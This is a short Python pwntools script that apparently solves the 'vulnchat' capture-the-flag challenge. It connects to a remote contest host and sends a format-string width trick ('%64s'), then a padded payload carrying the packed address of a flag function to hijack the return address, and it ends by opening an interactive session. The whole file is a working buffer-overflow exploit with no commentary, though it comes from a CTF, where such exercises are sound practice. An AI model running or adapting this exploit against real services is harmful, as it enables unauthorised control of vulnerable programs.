from pwn import *

# Addresses
flagFunc = 0x0804856b 

context.log_level = 'debug'

# Exploit
def main():

# open process
    #r = remote('localhost', 1234)
    r = remote('vulnchat.tuctf.com', 4141)
    exploit = 'A'*20
    exploit += '%64s'
    r.sendline(exploit)
    r.recvuntil('I can trust you?')
    exploit = 'A'*49
    exploit += p32(flagFunc) 
    r.sendline(exploit)

    r.send(exploit)
    r.interactive()
    
# Main
if __name__ == "__main__":
    main()
